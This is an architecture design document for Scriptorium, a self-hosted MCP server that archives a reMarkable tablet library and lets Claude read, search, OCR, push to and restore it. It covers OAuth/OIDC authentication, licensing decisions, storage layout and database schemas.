# Scriptorium — Architecture

*A self-hosted MCP server that keeps a reMarkable library on your own storage and lets Claude read, search, transcribe, push to, and restore it.*

Status: draft v0.2 · 2026-10-17 · v0.1 was adversarially reviewed; dispositions in `docs/Plan/03-review-dispositions.md`.

---

## 1. Summary

Scriptorium is a single Docker image, exposed at `https://mcp.example.com/mcp`. It does two jobs:

1. **Sync worker** — for every linked user, polls the reMarkable cloud, mirrors the full library to a persistent volume in the tablet's own on-disk format (keeping every superseded version), renders changed pages to PNG, and (optionally) transcribes them with Claude. It is the **only** process that writes to the reMarkable cloud.
2. **MCP server** — a Streamable HTTP MCP endpoint that any Claude client (claude.ai web/Desktop/mobile, Claude Code) connects to as a custom connector. Tools cover the reMarkable library, pushing documents to the tablet, OCR, backup/restore, and managing the server itself. Anything slow or cloud-writing is enqueued as a job for the worker.

Authentication is delegated to an external OAuth 2.1 / OIDC authority that the operator provides — **Scriptorium ships no identity provider**. Any issuer that supports PKCE public clients and RFC 8414/OIDC discovery works (§5.2 lists the exact requirements); Keycloak is the reference configuration and is available as an *optional* compose profile for operators who have no issuer yet. Each authenticated identity gets isolated storage, its own reMarkable device token, and its own OCR settings.

Scope is deliberately narrow: **reMarkable + managing Scriptorium**. Calendar, chat, ticketing, documentation and HR systems are other MCPs/connectors that Claude orchestrates alongside this one; Scriptorium knows nothing about them.

Not affiliated with reMarkable AS. The reMarkable cloud API is unofficial and may change without notice.

### Design principles

- **Never lose a note.** The archive only ever gains data unless a human explicitly confirms a purge. Cloud-side deletion, protocol changes, partial listings and account switches must not delete files.
- **The worker is the single cloud writer**, and every write is idempotent (upsert by document UUID).
- **Default deny.** No user can log in, and no one can spend the operator's API key, until the operator says so.
- **Untrusted input everywhere**: cloud metadata, note content, Markdown, URLs and the model's own tool arguments are all attacker-controlled.
- **Spikes before features.** Unverified protocol behaviour is a spike with a pass criterion, not an assumption in a milestone.

---

## 2. Goals and non-goals

### Goals

| # | Goal | Done when |
| --- | --- | --- |
| G1 | Complete, durable, versioned archive of each user's library | Every document the cloud has ever synced is on disk with original UUIDs and metadata; superseded versions are retained; cloud-side deletion and the free tier's 50-day sync cut-off never remove anything |
| G2 | Claude can read, search and look at notes from any client | `list`, `search`, `read_page`, `page_image` work from claude.ai mobile and Claude Code with the same identity |
| G3 | On-demand and folder-scoped automatic OCR, with three billing modes | Per-user key, server key, or lazy in-session transcription, chosen per user; spend capped per user and globally |
| G4 | Push documents to the tablet via the cloud | Markdown → PDF, PDF/EPUB by URL, images/SVG/PDF → native ink (`.rmdoc`, via the optional ink sidecar) |
| G5 | Restore after a wipe, without a cable | `restore` pushes missing documents (folders included) from the archive or a snapshot through the cloud, resumably and without duplicates |
| G6 | Multi-user, pluggable auth, no web admin | All user and admin operations are MCP tools; server-wide settings are environment/compose config; the OIDC issuer is a config value |

### Non-goals (v1)

- SSH/USB transports to the tablet (the container is not on the user's LAN in general).
- Handwriting search inside the reMarkable apps, screen share, or anything reMarkable Connect provides.
- A web UI. The identity provider's login page and a signed file-download endpoint (§11.0) are the only browser surfaces.
- Replacing the reMarkable cloud (see rmfakecloud, §13).
- Typed-text native notebooks from Markdown; Markdown pushes as PDF in v1.
- EPUB export, Markdown-with-images export, or any feature that would need the AGPL dependencies upstream uses (§4.4).

---

## 3. Context diagram

```
                    sync (official apps)                          ┌──────────────────────┐
 ┌───────────────┐ ───────────────────▶ ┌──────────────────┐      │  Claude API          │
 │ Paper Pro Move│                      │ reMarkable cloud │      │  (OCR, optional)     │
 └───────────────┘ ◀─────────────────── └──────────────────┘      └──────────▲───────────┘
                    push (Scriptorium)       ▲       │ poll / push            │ PNG → text
                                             │       ▼                        │
                        ┌────────────────────┴─────────────────────────────────┴───────────┐
                        │ Docker host                                                      │
                        │  ┌───────────────┐   ┌───────────────┐   ┌────────────────────┐  │
                        │  │ scriptorium   │   │ scriptorium   │   │ OIDC issuer        │  │
                        │  │ worker        │◀─▶│ server (/mcp) │   │ (operator-provided │  │
                        │  └───────┬───────┘   └───────▲───────┘   │  e.g. Keycloak)    │  │
                        │          │  /data (per-user) │ jobs      └──────────▲─────────┘  │
                        │          └────────┬──────────┘                      │            │
                        │            host-side snapshots                      │            │
                        │  ┌──────────────────────────────────────────────────┴─────────┐  │
                        │  │ reverse proxy (TLS, mcp.example.com, rate limits, IP rules)│  │
                        │  └───────────────────────────────▲────────────────────────────┘  │
                        └──────────────────────────────────┼───────────────────────────────┘
                                                           │ HTTPS, OAuth 2.1 bearer
                      ┌────────────────────────────────────┴──────────────────────────────┐
                      │ Claude clients: claude.ai (web, Desktop, mobile) · Claude Code    │
                      └───────────────────────────────────────────────────────────────────┘
```

Who calls whom: Claude clients call the server; the server reads `/data` and writes jobs; the worker calls the reMarkable cloud (all library reads and writes) and, optionally, the Claude API. The server's only cloud call is exchanging a one-time connect code for a device token. The OIDC issuer is called by Claude (login, token) and by the server (JWKS fetch only).

---

## 4. Components

### 4.1 One image, two processes

Same image, two entrypoints, run as two compose services sharing `/data`:

| Process | Entrypoint | Responsibilities |
| --- | --- | --- |
| `server` | `scriptorium serve` | Streamable HTTP MCP at `/mcp`; OAuth resource-server checks; all tools; reads the archive and index; enqueues jobs; signed downloads at `/dl/<token>`; `/healthz`; owns schema migrations |
| `worker` | `scriptorium worker` | Per-account poll loop; download, verify and atomically commit changed documents; version history; tombstones; render PNGs; auto-OCR; index maintenance; executes **all** jobs, including every cloud write (push, restore) |

They communicate only through the filesystem and SQLite. The server never writes to the reMarkable cloud; the worker never speaks HTTP to clients. There is no inter-process signalling: the worker polls the jobs table at ≤2 s.

### 4.2 Code layout

```
scriptorium/
  pyproject.toml            # uv project; see §4.3 and §4.4 for dependencies
  src/scriptorium/
    cli.py                  # serve | worker | admin (local-only helpers: migrate, gen-master-key, licence-check)
    config.py               # env → typed settings (pydantic-settings, SCRIPTORIUM_ prefix)
    auth/
      oidc.py               # issuer discovery, JWKS cache, JWT validation, claims → User
      metadata.py           # /.well-known/oauth-protected-resource document, 401 responses
      pat.py                # personal access tokens (scr_ prefix, hashed)
    users/
      store.py              # user registry, storage paths, quotas, link registry
      secrets.py            # MultiFernet encryption with SCRIPTORIUM_MASTER_KEY(S)
    cloud/
      client.py             # per-account cloud client (sync 1.5), explicit config, no globals
      sync.py               # root → diff → staged download → verify → atomic commit → tombstones
      upload.py             # idempotent upsert-by-UUID writes; PDF/EPUB and raw-document (.rmdoc) upload
    library/
      layout.py             # xochitl on-disk layout helpers, filename allowlist, path containment
      render.py             # .rm v6 → SVG (rmscene) → PNG (resvg-py); PDF pages via pypdfium2
      index.py              # per-account SQLite schema, FTS5, page hashes, transcripts, history, links
    jobs/
      queue.py              # leased job queue in scriptorium.sqlite (§6.2)
    ocr/
      modes.py              # user-key | server-key | lazy; caps
      claude.py             # Claude vision transcription (prompt, batches, cost accounting)
    push/
      markdown.py           # markdown → PDF in a sandboxed subprocess
      fetch.py              # SSRF-guarded URL fetch
      ink.py                # image/SVG/PDF → .rmdoc via the optional scriptorium-ink sidecar (AGPL, §4.4)
    backup/
      snapshots.py          # enumerate host snapshots (read-only mount) or restic
      restore.py            # diff archive vs cloud; push missing; parents first; resumable
    tools/
      _conventions.py       # identifiers, pagination, error model, confirmation tokens, annotations
      account.py library.py ocr.py push.py backup.py admin.py
    server.py               # ASGI app: well-known + healthz + /dl before the MCP SDK; per-request user context
    worker.py               # scheduler, per-account loops, job runner
  docker/
    Dockerfile  entrypoint.sh  compose.example.yml
    keycloak/realm-scriptorium.json     # realm export, imported at start (§5.3)
    proxy/                              # example per-path rules for Caddy / Traefik / nginx (§13)
  docs/   { Architecture.md, Plan/, Spikes/ }
  tests/
```

### 4.3 Dependency on `remarkable-mcp`

Decision: **library, not server**; **fork + pinned git dependency, not submodule.** Spike **S0** decides how much of the library we can actually consume.

What upstream gives us: the sync 1.5 protocol client (root index, generation-gated commits, content-addressed blob cache, parallel metadata fetches), `.rm` v6 rendering via rmscene, and PDF upload. What stands in the way, as shipped:

- `pymupdf` (AGPL) is a **hard** dependency used across exporters, extraction, Markdown→PDF, upload page-counting and the tools layer, not just rasterising.
- `ebooklib` (AGPL-3.0-or-later) is a hard dependency for EPUB handling.
- Module-level globals and environment reads (`REMARKABLE_TOKEN`, `REMARKABLE_CACHE_DIR`, `REMARKABLE_SYNC_WORKERS`) make per-user instantiation impossible without changes.
- `upload_document` mints the UUID internally and appends to the root, so retries can duplicate documents.
- The HTTP client is blocking (`requests`).

Plan:

1. Fork to `MilkyEngineer/remarkable-mcp`. The fork's first PRs make `pymupdf` and `ebooklib` **optional extras**, replace env reads with an explicit config object, and accept a caller-supplied document UUID with upsert semantics. Keep these upstreamable.
2. If S0 shows the diff would not stay small, **vendor** only the sync client and the stroke renderer into `scriptorium/cloud` and `scriptorium/library` with attribution, and stop depending on the package.
3. Either way, Scriptorium runs blocking library calls in a thread pool, never on the event loop.
4. `pyproject.toml` pins `remarkable-mcp @ git+https://github.com/MilkyEngineer/remarkable-mcp@<tag>` (or nothing, if vendored). Reproducible builds come from the tag plus `uv.lock`.

We do **not** run upstream's MCP server: its tool layer is single-user and its HTTP mode has no authentication by design.

### 4.4 Licensing

Scriptorium is MIT. The rule: **no copyleft (GPL/AGPL/LGPL-static) Python dependency in Scriptorium's process or in the image's `site-packages`.** Debian base-image and system libraries (some GPL/LGPL) are mere aggregation and are listed in the SBOM with their notices. CI runs `pip-licenses` over the built image and fails on GPL/AGPL (the `scriptorium licence-check` command does the same locally).

Checked 2026-10-17 (PyPI metadata unless stated):

| Dependency | Licence | Decision |
| --- | --- | --- |
| remarkable-mcp (fork), rmscene, mcp, markdown-it-py, PyJWT | MIT | Use |
| resvg-py | MIT (repository); wheel bundles the resvg crate, MPL-2.0. Wheel metadata has no licence field, so `pip-licenses` reports UNKNOWN: the licence gate allowlists `resvg_py` by name (S0) | Use for SVG → PNG |
| pypdfium2 | BSD-3 / Apache-2.0 | Use for PDF page rasterising |
| Pillow | MIT-CMU (PyPI metadata, checked 2026-10-18) | Use for compositing and PNG encoding in `library/render.py`; already a transitive dependency of the fork |
| WeasyPrint | BSD-3 | Use for Markdown/HTML → PDF (sandboxed, §9) |
| httpx, cryptography, pydantic | BSD-3 / Apache-2.0 / MIT | Use |
| Keycloak | Apache-2.0 | Separate container; no linkage |
| **PyMuPDF** | **AGPL-3.0 or commercial** | **Excluded.** Upstream hard dependency; fork makes it an optional extra we never install |
| **ebooklib** | **AGPL-3.0-or-later** | **Excluded.** Upstream hard dependency; fork makes it optional. EPUB push is pass-through bytes and needs no parser |
| **rmc** | MIT, but requires `rmscene<0.7` while upstream needs `≥0.8` | **Dropped.** Only needed for a non-goal |
| **rmink** | **AGPL-3.0-or-later** | **Excluded from the main image.** Runs in the optional `scriptorium-ink` sidecar: separate image, separate repo, generic bytes-in/`.rmdoc`-out HTTP API, no rmink code in the MIT image |

Native MIT image-to-ink (to retire the sidecar) must be a **clean-room** implementation on rmscene: nobody — human or coding agent — who writes it may have rmink's source in their working context. This is recorded in `CLAUDE.md`.

---

## 5. Identity and authentication

### 5.1 Model

Scriptorium is an **OAuth 2.1 resource server**. It never issues OAuth tokens and has no user database of its own beyond "which identity maps to which storage directory". The authorization server (AS) is external and configured by URL.

```
Claude ── POST /mcp (initialize, no token) ──▶ Scriptorium ── 401
            WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource", scope="scriptorium"
Claude ── GET /.well-known/oauth-protected-resource ──▶ PRM (below)
Claude ── discovery on ISSUER (OIDC and/or RFC 8414) ──▶ authorization_endpoint · token_endpoint · jwks_uri [· registration_endpoint]
Claude ── authorization code + PKCE S256 (pre-registered public client, or DCR/CIMD if the AS offers it) ──▶ AS
User   ── logs in at AS (password, or brokered Microsoft/Google) ──▶ AS
Claude ── code ──▶ AS ──▶ access token (JWT, aud ∋ resource) + rotating refresh token
Claude ── POST /mcp, Authorization: Bearer <JWT> ──▶ Scriptorium validates signature (JWKS), iss, aud membership, exp, nbf; reads sub, roles
```

Protected-resource metadata, served by Scriptorium (exact JSON):

```json
{
  "resource": "https://mcp.example.com/mcp",
  "authorization_servers": ["https://auth.example.com/realms/scriptorium"],
  "scopes_supported": ["scriptorium"],
  "bearer_methods_supported": ["header"],
  "resource_documentation": "https://github.com/MilkyEngineer/scriptorium"
}
```

401 contract: no token → `WWW-Authenticate: Bearer resource_metadata="…", scope="scriptorium"`; expired or invalid token → the same plus `error="invalid_token"` so the client refreshes; insufficient scope → 403 `error="insufficient_scope"`. `/.well-known/*`, `/healthz`, `/dl/*` and the 401 path are handled by Scriptorium's own ASGI middleware **before** the MCP SDK sees the request. `resource` is `SCRIPTORIUM_PUBLIC_URL` byte-for-byte (no trailing slash) and must equal the URL the user types into Claude.

Token validation: `iss` equals the configured issuer; `aud` (string or array) **contains** `SCRIPTORIUM_OIDC_AUDIENCE`; algorithms pinned to `RS256`/`ES256`; clock skew 60 s; JWKS cached, refetched on unknown `kid` at most once per 60 s (DoS cooldown) **and** when the cached set is older than `OIDC_JWKS_MAX_AGE_SECONDS` (default 3600, or a smaller `Cache-Control: max-age` from the issuer), so a key the issuer revokes stops being trusted within the hour; a refresh that fails falls back to a cached set no older than 24 h, otherwise the server fails closed. `jwks_uri` must share the issuer's scheme, host and port and the metadata and key documents are size-capped while streaming. Authenticated non-POST requests to `/mcp` get 405 (no server-held streams in stateless mode). Scopes are not part of validation unless `OIDC_REQUIRED_SCOPES` is set: `aud` membership is the authorization check, because issuers differ in how (and whether) they expose a scope claim. The audience comes from a mapper at the AS; Scriptorium does not rely on the OAuth `resource` parameter being honoured.

Key consequences:

- A **Scriptorium user is an identity at the AS**, keyed on `(iss, sub)`, not a Claude account. Two Claude accounts (for example a personal and an organisational one) that log in to the AS as the same user share one storage, one reMarkable link, one OCR configuration. Nothing is keyed on the Claude account.
- A reMarkable account can be linked to **one** Scriptorium user at a time. Linking a cloud account that is already linked elsewhere is refused with a generic message ("already linked to another user; ask an administrator"); only `admin_users` shows who. `admin_transfer_link(from, to)` moves a link when a user loses their AS identity. The reMarkable account identity used for this rule is the device token's `auth0-userid` claim, which S0 verified is identical across registrations and equals the user token's `sub`; the registry stores only its SHA-256. The user token's `auth0-profile` object (email, names) is never stored or logged.
- Claude Code uses a loopback redirect on a random port; the AS must accept `http://localhost/callback` and `http://127.0.0.1/callback` **port-agnostically**. Keycloak does this for loopback hosts when the URI is registered without a port; **S2** verifies on the pinned version.
- Claude's hosted clients call the AS and `/mcp` from Anthropic's egress range (`160.79.104.0/21`); **Claude Code calls both from the user's machine**, and users' browsers call the login pages. Any IP allowlist must account for all three (§13).

### 5.2 Pluggable authority

| Setting | Meaning |
| --- | --- |
| `SCRIPTORIUM_OIDC_ISSUER` | Issuer URL. Discovery at `<issuer>/.well-known/openid-configuration` and/or RFC 8414. Required. |
| `SCRIPTORIUM_OIDC_AUDIENCE` | Value that must appear in `aud` (default: `SCRIPTORIUM_PUBLIC_URL`). |
| `SCRIPTORIUM_OIDC_USER_CLAIM` | Claim used, together with `iss`, as the stable user id (default `sub`). It must be **immutable at the issuer**: anything else (`email`, `preferred_username`) is refused at start-up unless `SCRIPTORIUM_OIDC_UNSAFE_USER_CLAIM=true`, and `email` is only ever used when `email_verified` is `true`, with ASCII letters case-folded and nothing else normalised (no Unicode casefold or IDNA, so look-alike addresses never merge). The allowlist match uses the same rule. |
| `SCRIPTORIUM_OIDC_NAME_CLAIM` | Display name claim (default `preferred_username`, fallback `email`). |
| `SCRIPTORIUM_OIDC_ADMIN_CLAIM` / `SCRIPTORIUM_OIDC_ADMIN_VALUE` | Claim path and value that grants admin tools, e.g. `realm_access.roles` / `scriptorium-admin`. |
| `SCRIPTORIUM_OIDC_ALLOWED_USERS` | **Required.** Comma-separated `sub` values or emails. Emails match only when `email_verified` is `true`. The server refuses to start when this is empty unless `SCRIPTORIUM_ALLOW_ALL_ISSUER_USERS=true` is set explicitly. |

**Bring your own issuer.** Scriptorium contains no identity provider and the image has no dependency on Keycloak. An operator's issuer qualifies when it provides:

1. OIDC discovery (`/.well-known/openid-configuration`) and/or RFC 8414 metadata, reachable from Anthropic's egress range and from users' machines.
2. Authorization-code flow with PKCE S256 for **public** clients, and refresh tokens (`offline_access` or equivalent) with rotation.
3. A way for Claude to obtain a client: a pre-registered public client whose ID the user types into Claude (works everywhere), **or** DCR (RFC 7591), **or** Client ID Metadata Documents.
4. Redirect URIs `https://claude.ai/api/mcp/auth_callback` and port-agnostic `http://localhost/callback` / `http://127.0.0.1/callback` (the latter two only if Claude Code is used; otherwise a PAT, §5.4).
5. JWT access tokens whose `aud` can be made to contain `SCRIPTORIUM_OIDC_AUDIENCE`, signed with RS256/ES256 and published via `jwks_uri`.
6. A claim Scriptorium can read for admin gating (any claim path/value; a group, a role, or a single `sub`).

Expected to work: Keycloak (reference, §5.3), Authentik, Authelia, Zitadel, Auth0, Okta. **Microsoft Entra ID works directly** by pre-registering a public client and setting an Application ID URI as the audience; Google Workspace does not (no custom audience). Operators without an issuer start the optional `keycloak` compose profile (§13).

### 5.3 Keycloak reference configuration (optional profile)

For operators who have no issuer. Nothing in Scriptorium depends on it; it exists so the requirements in §5.2 have one worked, tested example. The realm is shipped as `docker/keycloak/realm-scriptorium.json` and loaded with `start --import-realm`, so the configuration below is reproducible, not clicked together. Keycloak is **pinned to the exact version S2 verifies**: `quay.io/keycloak/keycloak:26.4.7` (RFC 8414 metadata for path-based issuers, port-agnostic loopback redirects, `${VAR}` substitution from the environment at `--import-realm`). Client ID Metadata Documents need 26.6 or later and are therefore not part of the reference configuration.

**Client registration — decision: pre-registered public clients, no anonymous DCR.** Keycloak's Trusted Hosts policy matches hostnames or single IPs (with reverse-DNS for wildcards) and has no CIDR support, so it cannot be limited to Anthropic's egress range; anonymous DCR also registers a new client on every fresh Claude connection and runs into the default Max Clients (200). Two clients instead:

| Client ID | Type | Redirect URIs | Used by |
| --- | --- | --- | --- |
| `scriptorium-claude` | public, PKCE S256 required | `https://claude.ai/api/mcp/auth_callback` | claude.ai web, Desktop, mobile; the user enters the client ID in the custom-connector dialog |
| `scriptorium-claude-code` | public, PKCE S256 required | `http://localhost/callback`, `http://127.0.0.1/callback` (no port → any port) | `claude mcp add --transport http scriptorium <url> --client-id scriptorium-claude-code` |

Alternatives S2 evaluated (result: pre-registered clients ship; anonymous DCR fails closed under the Trusted Hosts policy and is left off; CIMD is unavailable on the pinned version): (a) DCR with "Host Sending Request Must Match" **off**, "Client URIs Must Match" **on**, Max Clients raised, a stale-client cleanup job, and the registration endpoint IP-limited at the proxy; (b) CIMD (`--features=cimd`, experimental), which Claude prefers when the AS advertises `client_id_metadata_document_supported`. Pre-registered clients ship unless S2 finds Claude cannot complete the flow with them.

**Scopes and claims.** Client scope `scriptorium` is a **realm default** scope so every client receives it. It carries: an audience mapper (`aud` += `https://mcp.example.com/mcp`), a realm-roles mapper (so `realm_access.roles` is present regardless of the client's Full Scope setting), `email` and `email_verified`. `offline_access` is enabled for both clients so Claude obtains refresh tokens. Realm role `scriptorium-admin` is granted to the operator. The role's scope mapping sits on each client, never on a client scope: Keycloak applies a scope that has role scope mappings only to users holding one of those roles, so a mapping on `scriptorium` would withhold the audience from every non-admin (found live 2026-10-18).

**Lifetimes (realm settings, exact).** Access Token Lifespan 15 min · SSO Session Idle 12 h · SSO Session Max 7 d · Offline Session Idle 30 d · Offline Session Max Limited off · Revoke Refresh Token **on**, Refresh Token Max Reuse **1** (so two Claude surfaces refreshing concurrently do not revoke each other's session). S2 observed a connector session surviving more than 24 h and well over a hundred access-token expiries across three claude.ai surfaces without a re-login, and two surfaces refreshing in the same hour without revoking each other; the `invalid_grant` re-prompt after a revoked session is still to be exercised (`docs/Spikes/S2.md` step 5).

**Identity.** Self-registration **off**. Identity brokers (Microsoft personal/work tenant, Google) optional, with "first broker login" set to **require manual account linking** rather than auto-link by email, so a stranger's Google account cannot become an existing user. Scriptorium's `ALLOWED_USERS` is the second gate.

**Exposure.** `KC_HOSTNAME_ADMIN` points at a loopback-only second binding of the same container (`127.0.0.1:8482`, reached over an SSH tunnel); the proxy denies `/admin` and `/realms/master` from the internet; `--http-enabled=true --proxy-headers=xforwarded` behind the TLS-terminating proxy. `hostname-admin` only rewrites URLs: Keycloak still serves the console on every port it listens on (S2), so when the proxy runs on another machine the proxy-facing port must be firewalled to the proxy's address.

### 5.4 Personal access tokens (Claude Code, scripts)

Claude Code can pass a static header (`--header "Authorization: Bearer …"`). Scriptorium mints **personal access tokens** via `create_token(name, ttl_days ≤ 90)`: format `scr_<base64url 32 bytes>` (prefix for secret scanners), SHA-256 stored, shown once, revocable, listed with last-used time. PATs map to the same user but **never carry admin rights**, expire at the TTL, and are revoked by `admin_disable_user` / `forget_me`. Hosted Claude apps use OAuth only.

---

## 6. Storage layout

All state under one volume, `/data`. `/data` must be a local POSIX filesystem (ext4, xfs, ZFS, btrfs). The server refuses to start unless the filesystem type read from `/proc/self/mountinfo` is on an allowlist (ext4, xfs, btrfs, zfs, f2fs, bcachefs; `statfs` cannot tell FUSE subtypes apart), and functional probes pass: a file can be written and fsynced, a POSIX lock taken in one process is seen by a second process, and a WAL-mode database written by one connection is readable by another. FUSE (including union/pool paths), network and overlay filesystems are refused because SQLite WAL depends on POSIX locks and a shared-memory file; the error message says where to mount instead (S5, `users/fs.py`).

```
/data/
  scriptorium.sqlite              # users, link registry, jobs, PATs, audit log (no content)
  users/<uid>/                    # uid = sha256(iss + "\n" + user_claim)[:16]
    secrets.enc                   # MultiFernet: reMarkable device token, per-user Claude API key
    removed/<acct>-<ts>/          # an account directory moved here by disconnect_remarkable(keep_archive=false); never deleted (§11.1)
    accounts/<acct>/              # one directory per reMarkable account ever linked; acct = ULID minted at link time
      blobs/<sha256>              # content-addressed blobs from the cloud; retained → version history
      library/                    # materialised current view in xochitl layout, original UUIDs
        <uuid>.metadata  <uuid>.content  <uuid>.pagedata
        <uuid>/<page-uuid>.rm  <uuid>/<page-uuid>-metadata.json
        <uuid>.pdf | .epub        # source file for annotated documents
        <uuid>.highlights/<page-uuid>.json      # highlighter selections on PDF/EPUB pages
        <uuid>.thumbnails/<page-uuid>.png|.jpg  # the cloud's own thumbnails
        <uuid>.textconversion/<page-uuid>.json  # the tablet's handwriting conversion
        .holding/<uuid>/<generation>/           # superseded entries of the same shapes; never unlinked
      tombstones/<uuid>/          # same layout (all of the above); moved here when the document leaves the cloud; NEVER auto-purged
      pages/<page-uuid>/<content-hash>.png        # archive render, 1×; <content-hash>.<N>px.png = cached downscales (§8.3)
      staging/<uuid>.<job>/       # in-progress downloads; swept on worker start
      index.sqlite                # documents, pages, history, transcripts, FTS5, links, tags, per-account settings
  snapshots/                      # read-only mount of host snapshots (zfs/btrfs), or the restic cache
```

Why the xochitl layout: it is what the tablet, the desktop app, the reMarkable cloud `.rmdoc` export, and every open-source tool understand. A cloud restore re-uploads the same files; nothing is converted on the way in. (Device-side files add sync flags, thumbnails and `.local` sidecars, so a future SSH restore is "copy plus regenerate", not a plain copy.)

**Versioning.** Blobs are content-addressed, so keeping superseded blobs costs only the changed pages. `library/` is a view over `blobs/`; every root generation that changes a document appends a `history` row `(uuid, generation, hash_root, seen_at)`. An erased page is therefore recoverable even with no filesystem snapshots. The document's index blob (the cloud's file → blob-hash list for that generation) is stored in `blobs/` under the SHA-256 of its body like any other blob, and the `history` row records that digest as `index_sha256` (a sync 1.5 document index is addressed by the hash of its entries, so `hash_root` is not the body's digest), so a `history` row resolves to the exact file set of that version. Hashes are lowercase hex throughout. Superseded `library/` entries go to `library/.holding/<uuid>/<generation>/` (never unlinked; readers of `library/` skip `.holding/`), and every archive change holds an exclusive `flock` on `<account>/.archive.lock`, so a second worker process waits rather than interleaves. Superseded blobs that are unreferenced by the current view, by tombstones, or by any history row younger than `BLOB_RETENTION_DAYS` (default 365) are eligible for `admin_gc_blobs(user, dry_run=true)` — a confirmed admin action, never automatic.

**Multiple accounts.** `connect_remarkable` on a user who already has an active account refuses unless `replace=true`; the old account directory is kept, marked inactive, and remains readable (`list(account=…)`) and restorable. Nothing from one account is ever compared against another, so a relink cannot mass-tombstone.

### 6.1 Per-account index schema

| Table | Columns (abridged) | Purpose |
| --- | --- | --- |
| `documents` | uuid PK, type (DocumentType/CollectionType), parent, name, last_modified, last_opened, deleted_at, deletion_cause (user/aged/unknown), source_kind, page_count, hash_root, generation, excluded_at (M2: set while the document is outside the sync scope; only `.metadata`/`.content` are fetched for it) | Library tree, listing, tombstones, scope |
| `history` | uuid, generation, hash_root, seen_at, index_sha256 (blob holding that version's file list); PK (uuid, generation) | Version history over retained blobs |
| `pages` | PK (document, uuid), document, uuid (page UUID from `.content`; not unique on its own), idx (0-based internally; tools expose 1-based; UNIQUE (document, idx)), content_hash, stable_since, rendered_at, png_path; index (uuid, content_hash) | Change detection, render cache, OCR debounce. A page is `(document, page UUID)`: page UUIDs collide whenever the same `.rm` files are uploaded more than once (open question 8), so documents can share them |
| `tags` (M2) | document, page (`''` for a document or folder tag: a WITHOUT ROWID key cannot hold NULL), name; PK (document, page, name); index (name). Filled at commit from the document's `.content` (`tags[]` and `pageTags[]`, names only, NFC-normalised and stripped; bounded: ≤ 100 tags per document counting page tags, ≤ 64 chars each, control, separator and bidi-control characters rejected, page tags for unknown pages dropped, every skip counted); folders' tags are stored too; replaced whole per document on every commit, so a tag removed on the tablet disappears here (`library/tags.py`) | `list(tags=)`, `search(tags=)`, `set_sync_scope` (§11) |
| `transcripts` | id INTEGER PK, UNIQUE (document, page, content_hash), text, model, mode (user/server/lazy), prompt_version (M2), input_tokens, output_tokens, cost_usd, created_at, doc_name, doc_path, doc_tags (M2: the names that apply to the page, its own and its document's, one per line; refreshed by `replace_tags`) | OCR cache keyed by document page and hash, so a page is transcribed once per version and per document (a re-uploaded copy has its own transcripts). The explicit integer key is the FTS external-content rowid (implicit rowids can be renumbered by `VACUUM`); `doc_name`/`doc_path` are denormalised so the FTS triggers delete exactly what they indexed, and are refreshed on rename or move of the document or any folder above it |
| `transcripts_fts` | FTS5 external-content table over `transcripts` (text, doc_name, doc_path, doc_tags), kept in step by triggers; V4 recreated and rebuilt it to add the fourth column, ids unchanged | `search` |
| `settings` (M2) | k TEXT PK, v TEXT (JSON) | Per-account user settings: `auto_ocr` (`{enabled, folders}`), `sync_scope` (`{mode, tags}`), later push defaults. They live in the account index rather than a per-user file because folder UUIDs and tags belong to one account, and the index is already snapshotted and transactional |
| `links` | page, kind, ref, created_by, created_at | Arbitrary external references written by Claude (calendar event id, ticket ID, document link); opaque strings |
| `sync_state` | k/v: last_root_hash, last_generation, last_full_listing_ok, previous_listing (the immediately preceding listing, complete or not, for the two-listings rule), anomaly, anomaly_reason, allow_mass_delete (JSON approval bound to a candidate set, §7 step 4), tombstoning_suspended_since, tombstoning_suspended_failed (§7 step 2) | Circuit breaker and safe mode (§7) |

Operation: `journal_mode=WAL`, `synchronous=NORMAL`, `busy_timeout=5000`, `foreign_keys=ON`; every connection is opened by `db/connect.py:open_sqlite`, which refuses a database that does not actually grant WAL. Write transactions are per document and short; foreign keys are deferred so the §7 commit can write history, pages and the document row in one transaction in any order. Timestamps are fixed-width ISO 8601 UTC text, so text order is time order and keyset cursors compare them directly. Listing cursors are opaque keyset cursors (the last row's sort key), never offsets. `documents.parent` is `NULL` for the root and `'trash'` for the top of the trash. Schema versions live in `PRAGMA user_version` as an append-only step sequence per file (`db/migrations.py` is the runner; `db/schema_account.py` the per-account steps); the **server** owns migrations at start-up (all pending steps in one `BEGIN IMMEDIATE`) and the worker waits until the version matches. Account step V2 rebuilt `pages` and `transcripts` under document-qualified keys (open question 8), keeping transcript ids so the FTS index stays valid.2 Global schema (`scriptorium.sqlite`)

| Table | Purpose |
| --- | --- |
| `users` | uid, iss, sub, display_name, created_at, disabled_at, quota_gb, server_key_allowed, ocr_cap_usd (M2: the user's own monthly cap on their own key, NULL = none) |
| `accounts` | acct, uid, rm_account_identity (nullable), active, linked_at, device_desc |
| `pats` | id, uid, name, sha256, created_at, expires_at, last_used_at, revoked_at |
| `jobs` | id, uid, acct, kind, dedupe_key UNIQUE, payload (JSON), state (queued/leased/done/failed/dead/cancelled), priority (M2; 0 normal, −1 for renders of tombstoned or trashed documents), lease_owner, lease_expires_at, attempts, max_attempts, next_run_at, result, error, created_at, updated_at |
| `ocr_spend` (M2) | id, uid, mode (user/server), model, input_tokens, output_tokens, cost_usd, at; indexes (uid, at), (at) | One row per transcribed page; the caps of §8.1 are sums over the UTC calendar month. Kept when a transcript is replaced or a user clears their key |
| `confirmations` (M2) | sha256 PK, used_at | Spent confirmation tokens (§11.0), so a token executes once |
| `audit` | ts, uid, tool, duration_ms, outcome, identifiers (JSON: document UUIDs, job id, bytes, url host, snapshot id — never content or secrets) |

